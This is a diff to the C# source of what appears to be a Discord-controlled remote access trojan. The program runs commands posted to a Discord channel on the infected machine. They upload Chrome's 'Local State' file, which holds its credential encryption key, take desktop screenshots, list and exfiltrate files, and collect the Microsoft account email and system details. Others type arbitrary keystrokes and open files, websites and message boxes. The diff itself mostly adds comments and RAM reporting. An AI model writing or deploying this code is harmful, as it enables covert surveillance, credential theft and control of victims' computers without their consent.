@@ -10,10 +10,12 @@ using System.Windows.Forms;
 using Discord;
 using Discord.WebSocket;
 using System.Windows.Input;
-using System.Timers;
 using System.Media;
 using Woof.SystemEx;
-using System.Windows.Media.Imaging;
+
+#warning The Commands Are Really Difficult To Understand, I Don't Put Any Effort Into These Projects :3
+
+#region entire code thing
 
 namespace uwu_poggy_woggy_boy
 {
@@ -32,13 +34,17 @@ namespace uwu_poggy_woggy_boy
             client = new DiscordSocketClient();
             client.MessageReceived += Commands;
 
-            string token = "Token";
+            string token = "token";
 
             await client.LoginAsync(TokenType.Bot, token);
             await client.StartAsync();
 
             await Task.Delay(-1);
         }
+
+        //These are the bot commands :3
+
+        //the commands are kinda self explanitory
 
         public Task Commands(SocketMessage message)
         {
@@ -55,40 +61,24 @@ namespace uwu_poggy_woggy_boy
                 key.DeleteValue("UwUOwOHehe", false);
             }
 
+            //gets the local state file from chrome
+
             if (message.Content == "+get chrome locals")
             {
                 message.Channel.SendMessageAsync("```" + Key.Enter + File.ReadAllText("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State" + "```"));
                 message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State");
             }
 
+            //make the host type anything u want :)
+
             if(message.Content.StartsWith("+type "))
             {
                 var arg = message.Content.Split(new[] { "+type " }, StringSplitOptions.None)[1];
                 SendKeys.SendWait(arg);
             }
-            /*if(message.Content == "+get pfp")
-            {
-                var idk = SysInfo.GetMicrosoftAccount(Environment.UserName);
-                string emailname = Path.ChangeExtension(idk, null);
-                var image = @"attachment:///C:/Users/" + Environment.UserName + "/AppData/Local/Temp/" + emailname + ".bmp";
-                var imagejpg = @"pfp.jpg";
-                Bitmap bmap;
-                ImageCodecInfo codecinfo;
-                Encoder encoder;
-                EncoderParameter encoderparam;
-                EncoderParameters encoderparams;
 
-                bmap = new Bitmap(image);
-                codecinfo = GetEncoderInfo("image/jpeg");
-                encoder = Encoder.Quality;
-                encoderparams = new EncoderParameters(1);
+            //gets the pc info
 
-                encoderparam = new EncoderParameter(encoder, 50L);
-                encoderparams.Param[0] = encoderparam;
-                bmap.Save(@"pfp.jpg", codecinfo, encoderparams);
-
-                message.Channel.SendFileAsync(imagejpg);
-            }*/
             if (message.Content == "+get info")
             {
                 var owo = SystemInformation.BootMode;
@@ -97,11 +87,16 @@ namespace uwu_poggy_woggy_boy
                 var idk = SysInfo.GetMicrosoftAccount(Environment.UserName);
                 var kk = SysInfo.SystemDiskSerialNumber;
                 string emailname = Path.ChangeExtension(idk, null);
+                var totalram = SysInfo.SystemMemoryTotal;
+                var freeram = SysInfo.SystemMemoryFree;
 
-                //if(idk2.Contains(".com") && idk2.Contains(".co") && idk2.Contains(".fr") && idk2.Contains(".it") && idk2.Contains(".ru") && idk2.Contains(".net") && idk2.Contains(".br") && idk2.Contains(".co.uk") && idk2.Contains(".es") && idk2.Contains(".nl") && idk2.Contains(".de") && idk2.Contains(".ca") && idk2.Contains(".co.jp") && idk2.Contains(".be") && idk2.Contains(".com.ar") && idk2.Contains(".com.mx") && idk2.Contains(".com.au") && idk2.Contains(".in") && idk2.Contains(".ch") && idk2.Contains(".com.sg") && idk2.Contains(".be") && )
+                var freeramnew = Convert.ToString(freeram);
 
-                var image = @"attachment:///C:/Users/" + Environment.UserName + "/AppData/Local/Temp/" + emailname + ".bmp";
-                
+                string freeramnewnew = Path.ChangeExtension(freeramnew, null);
+
+                var totalramnew = Convert.ToString(totalram);
+
+                string totalramnewnew = Path.ChangeExtension(totalramnew, null);
 
 
                 EmbedBuilder uwu = new EmbedBuilder();
@@ -113,13 +108,12 @@ namespace uwu_poggy_woggy_boy
                 uwu.AddField("BootMode", owo, true);
                 uwu.AddField("Network Presence", hehe, true);
                 uwu.AddField("Microsoft Account Email", idk, true);
-                //uwu.WithThumbnailUrl(image);
-
-
-                //uwu.ImageUrl = imagestring;
+                uwu.AddField("Free RAM", freeramnewnew + " GB", true);
+                uwu.AddField("Total RAM", totalramnewnew + " GB", true);
                 message.Channel.SendMessageAsync(null, false, uwu.Build());
-                //message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nOS Version" + System.Environment.OSVersion + "\nUser Name:" + System.Environment.UserName);
             }
+
+            //sends the desktop screenshots to discord
             
             if (message.Content == "+get desktop")
             {
@@ -127,6 +121,16 @@ namespace uwu_poggy_woggy_boy
                 {
                     Desktop();
                     Desktop1();
+                    var height = SystemInformation.VirtualScreen.Height;
+                    var width = SystemInformation.VirtualScreen.Width;
+
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Screen Resolution :)");
+                    uwu.WithFooter("Screen Width and Screen Height are the added up depending on the monitor orientation");
+                    uwu.AddField("Screen Height (Both Screens)", height, true);
+                    uwu.AddField("Screen Width (Both Screens)", width, true);
+
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                     message.Channel.SendFileAsync("uwu.png");
                     message.Channel.SendFileAsync("uwu2.png");
                 }
@@ -136,6 +140,8 @@ namespace uwu_poggy_woggy_boy
                     message.Channel.SendFileAsync("uwu.png");
                 }
             }
+
+            //plays audio on the host device
 
             if(message.Content.Contains("+audio "))
             {
@@ -152,6 +158,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
+            //plays looped audio on the host device
+
             if (message.Content.Contains("+audioloop "))
             {
                 var arg = message.Content.Split(new[] { "+audioloop " }, StringSplitOptions.None)[1];
@@ -166,6 +174,8 @@ namespace uwu_poggy_woggy_boy
                     message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
                 }
             }
+
+            //gets the file paths in a directory
 
             if (message.Content.StartsWith("+get files"))
             {
@@ -186,6 +196,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
+            //gets a file from a directory and uploads it
+
             if (message.Content.StartsWith("+get file "))
             {
                 var arg = message.Content.Split(new[] { "+get file " }, StringSplitOptions.None)[1];
@@ -199,6 +211,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
+            //opens a file :|
+
             if (message.Content.StartsWith("+open file "))
             {
                 var arg = message.Content.Split(new[] { "+open file " }, StringSplitOptions.None)[1];
@@ -211,6 +225,8 @@ namespace uwu_poggy_woggy_boy
                     message.Channel.SendMessageAsync("Directory not found.");
                 }
             }
+
+            //opens a website :|
 
             if (message.Content.StartsWith("+open web "))
             {
@@ -239,6 +255,8 @@ namespace uwu_poggy_woggy_boy
                 }
             }
 
+            //sends a messagebox to the hosts pc
+
             if (message.Content.StartsWith("+messagebox"))
             {
                 var arg = message.Content.Split(new[] { "+messagebox" }, StringSplitOptions.None)[1];
@@ -248,22 +266,10 @@ namespace uwu_poggy_woggy_boy
             return Task.CompletedTask;
         }
 
-        static void KeysPressed()
-        {
+        #endregion
 
-        }
-        private static ImageCodecInfo GetEncoderInfo(String mimeType)
-        {
-            int j;
-            ImageCodecInfo[] encoders;
-            encoders = ImageCodecInfo.GetImageEncoders();
-            for (j = 0; j < encoders.Length; ++j)
-            {
-                if (encoders[j].MimeType == mimeType)
-                    return encoders[j];
-            }
-            return null;
-        }
+        //gets the first desktop screen
+
         void Desktop()
         {
             Rectangle size = Screen.GetBounds(Point.Empty);
@@ -273,6 +279,9 @@ namespace uwu_poggy_woggy_boy
             cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
             cBitmap.Save(@"uwu.png", System.Drawing.Imaging.ImageFormat.Jpeg);
         }
+
+        //gets the second desktop screen
+
         void Desktop1()
         {
             Rectangle size = Screen.GetBounds(Point.Empty);
@@ -281,18 +290,6 @@ namespace uwu_poggy_woggy_boy
             Graphics cGraphics = Graphics.FromImage(cBitmap);
             cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
             cBitmap.Save(@"uwu2.png", System.Drawing.Imaging.ImageFormat.Jpeg);
-        }
-        string GetIp()
-        {
-            var host = Dns.GetHostEntry(Dns.GetHostName());
-            foreach (var ip in host.AddressList)
-            {
-                if (ip.AddressFamily == AddressFamily.InterNetwork)
-                {
-                    return ip.ToString();
-                }
-            }
-            throw new Exception("no");
         }
 
         private void winforms_are_shit_Load(object sender, EventArgs e)
